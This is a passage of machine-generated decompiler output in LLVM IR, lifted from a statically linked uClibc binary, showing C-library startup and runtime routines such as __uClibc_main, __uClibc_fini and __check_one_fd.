    i32 102, label %dec_label_pc_804b6ec
    i32 103, label %dec_label_pc_804b729
    i32 104, label %dec_label_pc_804b701
    i32 105, label %dec_label_pc_804b6b3
    i32 106, label %dec_label_pc_804b70f
    i32 107, label %dec_label_pc_804b70f
    i32 108, label %dec_label_pc_804b6f3
    i32 109, label %dec_label_pc_804b730
    i32 110, label %dec_label_pc_804b74c
    i32 111, label %dec_label_pc_804b6ec
    i32 112, label %dec_label_pc_804b729
    i32 113, label %dec_label_pc_804b74c
    i32 114, label %dec_label_pc_804b6bd
    i32 115, label %dec_label_pc_804b745
    i32 116, label %dec_label_pc_804b724
    i32 117, label %dec_label_pc_804b724
    i32 118, label %dec_label_pc_804b6c7
    i32 119, label %dec_label_pc_804b6d1
    i32 120, label %dec_label_pc_804b73e
    i32 121, label %dec_label_pc_804b701
    i32 122, label %dec_label_pc_804b701
    i32 123, label %dec_label_pc_804b701
    i32 124, label %dec_label_pc_804b701
    i32 125, label %dec_label_pc_804b625
    i32 126, label %dec_label_pc_804b625
    i32 127, label %dec_label_pc_804b724
    i32 128, label %dec_label_pc_804b724
    i32 129, label %dec_label_pc_804b625
    i32 130, label %dec_label_pc_804b625
    i32 131, label %dec_label_pc_804b724
    i32 149, label %dec_label_pc_804b6d8
  ]

dec_label_pc_804b625:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b62f:                             ; preds = %entry
  %v1_804b62f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804b634 = inttoptr i32 %v1_804b62f to i32*
  store i32 22, i32* %v1_804b634, align 4
  br label %dec_label_pc_804b724

dec_label_pc_804b63f:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b649:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b653:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b65d:                             ; preds = %entry
  %v0_804b660 = call i32 @getdtablesize()
  br label %dec_label_pc_804b665

dec_label_pc_804b665:                             ; preds = %entry, %dec_label_pc_804b65d
  br label %dec_label_pc_804b751

dec_label_pc_804b66f:                             ; preds = %entry
  %v0_804b672 = call i32 @__GI_getpagesize()
  br label %dec_label_pc_804b677

dec_label_pc_804b677:                             ; preds = %entry, %dec_label_pc_804b66f
  br label %dec_label_pc_804b751

dec_label_pc_804b681:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b68b:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b695:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b69f:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b6a9:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b6b3:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b6bd:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b6c7:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b6d1:                             ; preds = %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b6d8:                             ; preds = %entry
  %v5_804b6de = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804b6e6 = icmp slt i32 %v5_804b6de, 0
  %v1_804b6e8 = icmp eq i1 %v2_804b6e6, false
  br i1 %v1_804b6e8, label %dec_label_pc_804b6fa, label %dec_label_pc_804b724

dec_label_pc_804b6ec:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b6f3:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b6fa:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b6d8
  br label %dec_label_pc_804b751

dec_label_pc_804b701:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b708:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b70f:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b716:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b71d:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b724:                             ; preds = %dec_label_pc_804b6d8, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b62f
  br label %dec_label_pc_804b751

dec_label_pc_804b729:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b730:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b737:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b73e:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b745:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b74c:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_804b751

dec_label_pc_804b751:                             ; preds = %dec_label_pc_804b745, %dec_label_pc_804b73e, %dec_label_pc_804b737, %dec_label_pc_804b730, %dec_label_pc_804b729, %dec_label_pc_804b71d, %dec_label_pc_804b716, %dec_label_pc_804b70f, %dec_label_pc_804b708, %dec_label_pc_804b701, %dec_label_pc_804b6f3, %dec_label_pc_804b6ec, %dec_label_pc_804b6fa, %dec_label_pc_804b6d1, %dec_label_pc_804b6c7, %dec_label_pc_804b6bd, %dec_label_pc_804b6b3, %dec_label_pc_804b6a9, %dec_label_pc_804b69f, %dec_label_pc_804b695, %dec_label_pc_804b68b, %dec_label_pc_804b681, %dec_label_pc_804b677, %dec_label_pc_804b665, %dec_label_pc_804b653, %dec_label_pc_804b649, %dec_label_pc_804b63f, %dec_label_pc_804b625, %dec_label_pc_804b724, %dec_label_pc_804b74c
  %v0_804b754 = phi i32 [ 255, %dec_label_pc_804b745 ], [ 2048, %dec_label_pc_804b73e ], [ 99, %dec_label_pc_804b737 ], [ 20, %dec_label_pc_804b730 ], [ -128, %dec_label_pc_804b729 ], [ 1024, %dec_label_pc_804b71d ], [ 4, %dec_label_pc_804b716 ], [ 32, %dec_label_pc_804b70f ], [ 256, %dec_label_pc_804b708 ], [ 2147483647, %dec_label_pc_804b701 ], [ 16, %dec_label_pc_804b6f3 ], [ 127, %dec_label_pc_804b6ec ], [ 200112, %dec_label_pc_804b6fa ], [ 9, %dec_label_pc_804b6d1 ], [ 65535, %dec_label_pc_804b6c7 ], [ -32768, %dec_label_pc_804b6bd ], [ -2147483648, %dec_label_pc_804b6b3 ], [ 8, %dec_label_pc_804b6a9 ], [ 500, %dec_label_pc_804b69f ], [ 4096, %dec_label_pc_804b695 ], [ 16384, %dec_label_pc_804b68b ], [ 1000, %dec_label_pc_804b681 ], [ 32768, %dec_label_pc_804b677 ], [ 6, %dec_label_pc_804b665 ], [ 65536, %dec_label_pc_804b653 ], [ 100, %dec_label_pc_804b649 ], [ 131072, %dec_label_pc_804b63f ], [ 1, %dec_label_pc_804b625 ], [ -1, %dec_label_pc_804b724 ], [ 32767, %dec_label_pc_804b74c ]
  ret i32 %v0_804b754

; uselistorder directives
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 65, { 1, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 30, { 5, 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_804b751, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_804b724, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804b6fa, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b677, { 1, 0 }
  uselistorder label %dec_label_pc_804b665, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b758 = load i32, i32* @ebx, align 4
  store i32 %v0_804b758, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b76c, label %dec_label_pc_804b779

dec_label_pc_804b76c:                             ; preds = %entry, %dec_label_pc_804b76c
  %v1_804b7736 = phi i32 [ %v1_804b773, %dec_label_pc_804b76c ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_804b773.70 to i32), i32* %stack_var_-16, align 4
  %v5_804b76c = mul i32 %v1_804b7736, 4
  %v6_804b76c = add i32 %v5_804b76c, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b76c = inttoptr i32 %v6_804b76c to i32*
  %v8_804b76c = load i32, i32* %v7_804b76c, align 4
  call void @__pseudo_call(i32 %v8_804b76c)
  %v0_804b773.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b773 = add i32 %v0_804b773.pre, -1
  store i32 %v1_804b773, i32* %ebx.global-to-local, align 4
  %v10_804b774 = icmp eq i32 %v0_804b773.pre, 0
  %v1_804b777 = icmp eq i1 %v10_804b774, false
  br i1 %v1_804b777, label %dec_label_pc_804b76c, label %dec_label_pc_804b779

dec_label_pc_804b779:                             ; preds = %dec_label_pc_804b76c, %entry
  %v0_804b779 = load i32, i32* @global_var_8052514.71, align 4
  %v1_804b77e = icmp eq i32 %v0_804b779, 0
  br i1 %v1_804b77e, label %dec_label_pc_804b784, label %dec_label_pc_804b782

dec_label_pc_804b782:                             ; preds = %dec_label_pc_804b779
  %v0_804b782 = load i32, i32* %stack_var_-16, align 4
  %v1_804b782 = call i32 @unknown_0(i32 %v0_804b782)
  br label %dec_label_pc_804b784

dec_label_pc_804b784:                             ; preds = %dec_label_pc_804b782, %dec_label_pc_804b779
  %v0_804b784 = load i32, i32* @global_var_8052518.72, align 8
  %v1_804b78a = icmp eq i32 %v0_804b784, 0
  br i1 %v1_804b78a, label %dec_label_pc_804b793, label %dec_label_pc_804b78e

dec_label_pc_804b78e:                             ; preds = %dec_label_pc_804b784
  %v2_804b78e = load i32, i32* %stack_var_-16, align 4
  %v1_804b791 = call i32 @unknown_0(i32 %v2_804b78e)
  br label %dec_label_pc_804b793

dec_label_pc_804b793:                             ; preds = %dec_label_pc_804b784, %dec_label_pc_804b78e
  %v2_804b793 = load i32, i32* %stack_var_-12, align 4
  %v2_804b795 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b795, i32* @ebx, align 4
  ret i32 %v2_804b793

; uselistorder directives
  uselistorder i32 %v1_804b773, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b793, { 1, 0 }
  uselistorder label %dec_label_pc_804b76c, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b79a = load i32, i32* @eax, align 4
  ret i32 %v0_804b79a
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804b79b = load i32, i32* @esi, align 4
  %v0_804b79c = load i32, i32* @eax, align 4
  store i32 %v0_804b79c, i32* @esi, align 4
  %v0_804b79e = load i32, i32* @ebx, align 4
  store i32 %v0_804b79e, i32* %stack_var_-8, align 4
  %v0_804b79f = load i32, i32* @edx, align 4
  store i32 %v0_804b79f, i32* @ebx, align 4
  %v4_804b7a7 = call i32 @__libc_fcntl(i32 %v0_804b79c, i32 1, i32 %tmp6)
  %v1_804b7af = add i32 %v4_804b7a7, 1
  %v8_804b7af = icmp eq i32 %v1_804b7af, 0
  %v1_804b7b0 = icmp eq i1 %v8_804b7af, false
  br i1 %v1_804b7b0, label %dec_label_pc_804b7cb, label %dec_label_pc_804b7b2

dec_label_pc_804b7b2:                             ; preds = %entry
  %v0_804b7b4 = load i32, i32* @ebx, align 4
  %v5_804b7ba = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80507e0.73, i32 0, i32 0), i32 %v0_804b7b4, i32 %v1_804b7af)
  %v1_804b7c2 = load i32, i32* @esi, align 4
  %v12_804b7c2 = icmp eq i32 %v5_804b7ba, %v1_804b7c2
  br i1 %v12_804b7c2, label %dec_label_pc_804b7cb, label %dec_label_pc_804b7c6

dec_label_pc_804b7c6:                             ; preds = %dec_label_pc_804b7b2
  %v0_804b7c6 = call i32 @abort()
  br label %dec_label_pc_804b7cb

dec_label_pc_804b7cb:                             ; preds = %dec_label_pc_804b7b2, %entry, %dec_label_pc_804b7c6
  %v2_804b7cb = load i32, i32* %stack_var_-12, align 4
  %v2_804b7cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b7cc, i32* @ebx, align 4
  store i32 %v0_804b79b, i32* @esi, align 4
  ret i32 %v2_804b7cb

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b7cb, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_804b7d2 = load i8, i8* @global_var_805251c.74, align 4
  %v1_804b7d2 = icmp eq i8 %v0_804b7d2, 0
  %v1_804b7d9 = icmp eq i1 %v1_804b7d2, false
  br i1 %v1_804b7d9, label %entry.dec_label_pc_804b80b_crit_edge, label %dec_label_pc_804b7db

entry.dec_label_pc_804b80b_crit_edge:             ; preds = %entry
  %v0_804b80e.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804b80b

dec_label_pc_804b7db:                             ; preds = %entry
  store i8 1, i8* @global_var_805251c.74, align 4
  store i32 4096, i32* @global_var_8052510.75, align 16
  %v0_804b806 = call i32 @_stdio_init()
  br label %dec_label_pc_804b80b

dec_label_pc_804b80b:                             ; preds = %entry.dec_label_pc_804b80b_crit_edge, %dec_label_pc_804b7db
  %v0_804b80e = phi i32 [ %v0_804b80e.pre, %entry.dec_label_pc_804b80b_crit_edge ], [ %v0_804b806, %dec_label_pc_804b7db ]
  ret i32 %v0_804b80e

; uselistorder directives
  uselistorder i8* @global_var_805251c.74, { 1, 0 }
  uselistorder label %dec_label_pc_804b80b, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp30 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_804b810 = load i32, i32* @edi, align 4
  store i32 %tmp30, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8052508.76, align 8
  store i32 %arg6, i32* @global_var_8052518.72, align 8
  %v2_804b846 = mul i32 %arg2, 4
  %v3_804b846 = add i32 %tmp30, %v2_804b846
  %v1_804b849 = add i32 %v3_804b846, 4
  store i32 %v1_804b849, i32* @global_var_805250c.77, align 4
  %v3_804b852 = load i32, i32* %arg3, align 4
  %v14_804b852 = icmp eq i32 %v1_804b849, %v3_804b852
  store i32 0, i32* %stack_var_-168, align 4
  %v1_804b858 = icmp eq i1 %v14_804b852, false
  %v4_804b858 = select i1 %v1_804b858, i32 %v1_804b849, i32 %v3_804b846
  store i32 %v4_804b858, i32* @global_var_805250c.77, align 4
  %v2_804b860 = ptrtoint i32* %stack_var_-136 to i32
  %v3_804b865 = bitcast i32* %stack_var_-136 to i8*
  %v4_804b865 = call i32 @__GI_memset(i8* %v3_804b865, i32 0, i32 120)
  %v0_804b86a = load i32, i32* @global_var_805250c.77, align 4
  br label %dec_label_pc_804b872

dec_label_pc_804b872:                             ; preds = %dec_label_pc_804b872, %entry
  %v0_804b872 = phi i32 [ %v1_804b875, %dec_label_pc_804b872 ], [ %v0_804b86a, %entry ]
  %v1_804b872 = inttoptr i32 %v0_804b872 to i32*
  %v2_804b872 = load i32, i32* %v1_804b872, align 4
  %v3_804b872 = icmp eq i32 %v2_804b872, 0
  %v1_804b875 = add i32 %v0_804b872, 4
  %v1_804b878 = icmp eq i1 %v3_804b872, false
  br i1 %v1_804b878, label %dec_label_pc_804b872, label %dec_label_pc_804b899.preheader

dec_label_pc_804b899.preheader:                   ; preds = %dec_label_pc_804b872
  store i32 %v1_804b875, i32* @ebx, align 4
  %v1_804b8991 = inttoptr i32 %v1_804b875 to i32*
  %v2_804b8992 = load i32, i32* %v1_804b8991, align 4
  %v3_804b8993 = icmp eq i32 %v2_804b8992, 0
  %v1_804b89c10 = icmp eq i1 %v3_804b8993, false
  br i1 %v1_804b89c10, label %dec_label_pc_804b87e.lr.ph, label %dec_label_pc_804b89e

dec_label_pc_804b87e.lr.ph:                       ; preds = %dec_label_pc_804b899.preheader
  %v3_804b856 = ptrtoint i32* %stack_var_-168 to i32
  %v3_804b889 = add i32 %v3_804b856, 32
  br label %dec_label_pc_804b87e

dec_label_pc_804b87e:                             ; preds = %dec_label_pc_804b87e.lr.ph, %dec_label_pc_804b896
  %v1_804b889 = phi i32 [ %v2_804b8992, %dec_label_pc_804b87e.lr.ph ], [ %v2_804b899, %dec_label_pc_804b896 ]
  %v0_804b888 = phi i32 [ %v1_804b875, %dec_label_pc_804b87e.lr.ph ], [ %v1_804b896, %dec_label_pc_804b896 ]
  %v6_804b883 = icmp ugt i32 %v1_804b889, 14
  br i1 %v6_804b883, label %dec_label_pc_804b896, label %dec_label_pc_804b885

dec_label_pc_804b885:                             ; preds = %dec_label_pc_804b87e
  store i32 %v0_804b888, i32* %stack_var_-168, align 4
  %v2_804b889 = mul i32 %v1_804b889, 8
  %v4_804b889 = add i32 %v3_804b889, %v2_804b889
  %v3_804b88e = inttoptr i32 %v4_804b889 to i16*
  %v4_804b88e = call i32 @memcpy(i16* %v3_804b88e, i32 %v0_804b888, i32 8)
  %v0_804b896.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804b896

dec_label_pc_804b896:                             ; preds = %dec_label_pc_804b87e, %dec_label_pc_804b885
  %v0_804b896 = phi i32 [ %v0_804b888, %dec_label_pc_804b87e ], [ %v0_804b896.pre, %dec_label_pc_804b885 ]
  %v1_804b896 = add i32 %v0_804b896, 8
  store i32 %v1_804b896, i32* @ebx, align 4
  %v1_804b899 = inttoptr i32 %v1_804b896 to i32*
  %v2_804b899 = load i32, i32* %v1_804b899, align 4
  %v3_804b899 = icmp eq i32 %v2_804b899, 0
  %v1_804b89c = icmp eq i1 %v3_804b899, false
  br i1 %v1_804b89c, label %dec_label_pc_804b87e, label %dec_label_pc_804b89e

dec_label_pc_804b89e:                             ; preds = %dec_label_pc_804b896, %dec_label_pc_804b899.preheader
  store i32 %v2_804b860, i32* @eax, align 4
  %v0_804b8a2 = call i32 @_dl_aux_init()
  store i32 %v0_804b8a2, i32* @eax, align 4
  %v0_804b8a7 = call i32 @__GI___uClibc_init()
  %v1_804b8b5 = icmp eq i32 %tmp25, 0
  %v3_804b8b7 = select i1 %v1_804b8b5, i32 4096, i32 %tmp25
  %v13_804b8ba = icmp eq i32 %tmp24, -1
  store i32 %v3_804b8b7, i32* @global_var_8052510.75, align 16
  %v1_804b8c4 = icmp eq i1 %v13_804b8ba, false
  br i1 %v1_804b8c4, label %dec_label_pc_804b8ef, label %dec_label_pc_804b8c6

dec_label_pc_804b8c6:                             ; preds = %dec_label_pc_804b89e
  %v0_804b8c6 = call i32 @getuid()
  store i32 %v0_804b8c6, i32* @ebx, align 4
  %v0_804b8cd = call i32 @geteuid()
  %v0_804b8d2 = load i32, i32* @ebx, align 4
  %v12_804b8d2 = icmp eq i32 %v0_804b8d2, %v0_804b8cd
  %v1_804b8d4 = icmp eq i1 %v12_804b8d2, false
  br i1 %v1_804b8d4, label %dec_label_pc_804b905, label %dec_label_pc_804b8d6

dec_label_pc_804b8d6:                             ; preds = %dec_label_pc_804b8c6
  %v0_804b8d6 = call i32 @getgid()
  store i32 %v0_804b8d6, i32* @ebx, align 4
  %v0_804b8dd = call i32 @getegid()
  %v0_804b8e2 = load i32, i32* @ebx, align 4
  %v12_804b8e2 = icmp eq i32 %v0_804b8e2, %v0_804b8dd
  %v1_804b8e4 = icmp eq i1 %v12_804b8e2, false
  br i1 %v1_804b8e4, label %dec_label_pc_804b905, label %dec_label_pc_804b8e6.thread

dec_label_pc_804b8e6.thread:                      ; preds = %dec_label_pc_804b8d6
  br label %dec_label_pc_804b92f

dec_label_pc_804b8ef:                             ; preds = %dec_label_pc_804b89e
  %v15_804b8ef = icmp eq i32 %tmp24, %tmp23
  %v1_804b8f3 = icmp eq i1 %v15_804b8ef, false
  br i1 %v1_804b8f3, label %dec_label_pc_804b905, label %dec_label_pc_804b8f5

dec_label_pc_804b8f5:                             ; preds = %dec_label_pc_804b8ef
  br label %dec_label_pc_804b905

dec_label_pc_804b905:                             ; preds = %dec_label_pc_804b8f5, %dec_label_pc_804b8d6, %dec_label_pc_804b8c6, %dec_label_pc_804b8ef
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804b90c = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804b91b = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804b92a = call i32 @__check_one_fd()
  br label %dec_label_pc_804b92f

dec_label_pc_804b92f:                             ; preds = %dec_label_pc_804b8e6.thread, %dec_label_pc_804b905
  %v0_804b92f = load i32, i32* @edi, align 4
  %v1_804b92f = inttoptr i32 %v0_804b92f to i32*
  %v2_804b92f = load i32, i32* %v1_804b92f, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_804b92f, i32* bitcast (i32** @global_var_8052158.79 to i32*), align 8
  store i32 %arg5, i32* @global_var_8052514.71, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b954, label %dec_label_pc_804b960

dec_label_pc_804b954:                             ; preds = %dec_label_pc_804b92f, %dec_label_pc_804b954
  %v4_804b95446 = phi i32 [ %v1_804b95b, %dec_label_pc_804b954 ], [ 0, %dec_label_pc_804b92f ]
  %v5_804b954 = mul i32 %v4_804b95446, 4
  %v6_804b954 = add i32 %v5_804b954, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b954 = inttoptr i32 %v6_804b954 to i32*
  %v8_804b954 = load i32, i32* %v7_804b954, align 4
  call void @__pseudo_call(i32 %v8_804b954)
  %v0_804b95b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b95b = add i32 %v0_804b95b, 1
  store i32 %v1_804b95b, i32* %ebx.global-to-local, align 4
  %v1_804b95c.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804b95c = icmp ult i32 %v1_804b95b, %v1_804b95c.pre
  br i1 %v7_804b95c, label %dec_label_pc_804b954, label %dec_label_pc_804b960

dec_label_pc_804b960:                             ; preds = %dec_label_pc_804b954, %dec_label_pc_804b92f
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b978, label %dec_label_pc_804b984

dec_label_pc_804b978:                             ; preds = %dec_label_pc_804b960, %dec_label_pc_804b978
  %v4_804b97845 = phi i32 [ %v1_804b97f, %dec_label_pc_804b978 ], [ 0, %dec_label_pc_804b960 ]
  store i32 ptrtoint (i32* @global_var_804b97f.81 to i32), i32* %stack_var_-168, align 4
  %v5_804b978 = mul i32 %v4_804b97845, 4
  %v6_804b978 = add i32 %v5_804b978, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b978 = inttoptr i32 %v6_804b978 to i32*
  %v8_804b978 = load i32, i32* %v7_804b978, align 4
  call void @__pseudo_call(i32 %v8_804b978)
  %v0_804b97f = load i32, i32* @ebx, align 4
  %v1_804b97f = add i32 %v0_804b97f, 1
  store i32 %v1_804b97f, i32* @ebx, align 4
  %v1_804b980.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804b980 = icmp ult i32 %v1_804b97f, %v1_804b980.pre
  br i1 %v7_804b980, label %dec_label_pc_804b978, label %dec_label_pc_804b984

dec_label_pc_804b984:                             ; preds = %dec_label_pc_804b978, %dec_label_pc_804b960
  %v0_804b98d = load i32, i32* %stack_var_-168, align 4
  %v1_804b98d = call i32 @__errno_location(i32 %v0_804b98d)
  %v1_804b992 = inttoptr i32 %v1_804b98d to i32*
  store i32 0, i32* %v1_804b992, align 4
  %v0_804b9a1 = call i32 @__GI___h_errno_location()
  store i32 %v0_804b9a1, i32* @eax, align 4
  %v1_804b9a6 = inttoptr i32 %v0_804b9a1 to i32*
  store i32 0, i32* %v1_804b9a6, align 4
  %v0_804b9ac = load i32, i32* @eax, align 4
  store i32 %v0_804b9ac, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_804b810)
  %v0_804b9c2 = load i32, i32* @eax, align 4
  %v1_804b9c5 = call i32 @__GI_exit(i32 %v0_804b9c2)
  %v0_804b9d1 = load i32, i32* @ebx, align 4
  %v1_804b9d1 = inttoptr i32 %v0_804b9d1 to %sigcontext*
  %v2_804b9d1 = call i32 @sigreturn(%sigcontext* %v1_804b9d1)
  %v0_804b9d9 = load i32, i32* @ebx, align 4
  %v1_804b9d9 = inttoptr i32 %v0_804b9d9 to %sigcontext*
  %v2_804b9d9 = call i32 @sigreturn(%sigcontext* %v1_804b9d9)
  ret i32 %v2_804b9d9

; uselistorder directives
  uselistorder i32 %v1_804b97f, { 1, 2, 0 }
  uselistorder i32 %v1_804b95b, { 1, 2, 0 }
  uselistorder i32 %v2_804b899, { 1, 0 }
  uselistorder i32 %v1_804b896, { 2, 1, 0 }
  uselistorder i32 %v1_804b875, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804b872, { 1, 0 }
  uselistorder i32 %v1_804b849, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 1, 0, 2 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b978, { 1, 0 }
  uselistorder label %dec_label_pc_804b954, { 1, 0 }
  uselistorder label %dec_label_pc_804b92f, { 1, 0 }
  uselistorder label %dec_label_pc_804b905, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804b896, { 1, 0 }
  uselistorder label %dec_label_pc_804b87e, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804b9db = load i32, i32* @esi, align 4
  %v0_804b9dc = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804b9f1 = icmp eq i32* %arg2, null
  br i1 %v1_804b9f1, label %dec_label_pc_804ba45, label %dec_label_pc_804b9f5

dec_label_pc_804b9f5:                             ; preds = %entry
